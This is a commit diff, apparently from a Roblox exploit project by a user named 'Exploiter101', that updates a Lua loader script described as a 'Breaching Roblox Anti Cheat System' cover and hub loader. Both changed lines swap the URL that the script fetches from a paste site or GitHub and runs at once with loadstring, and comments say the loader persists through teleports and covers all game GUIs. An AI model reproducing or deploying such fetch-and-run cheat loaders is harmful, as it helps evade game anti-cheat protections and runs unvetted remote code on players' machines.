6f5e6deab7ac77b0be4ff78b00c6a9d29a3b060f
Exploiter101 <aplogsiptun@gmail.com>
2025-06-16 00:13:48 +0800

    Update sec2.lua

--- sec2.lua
+++ sec2.lua
@@ -1,7 +1,7 @@
 -- Q-Themed "Breaching Roblox Anti Cheat System" Aesthetic Loading Cover + Hub Loader (Persistent)
 -- Covers all GUIs, animated, stays on top, persists through teleports, professional/futuristic purple theme
 
-local hubLoader = 'loadstring(game:HttpGet("https://pastefy.app/TNa3LYIt/raw"))()'
+local hubLoader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/Loaderv3/refs/heads/main/LoaderV3.lua"))()'
 
 local coverScript = [[
 local function showQBreachingCover()
@@ -219,7 +219,7 @@ if queueonteleport then
 end
 
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/TNa3LYIt/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/Loaderv3/refs/heads/main/LoaderV3.lua"))()
 end)
 
 local function showQBreachingCover()
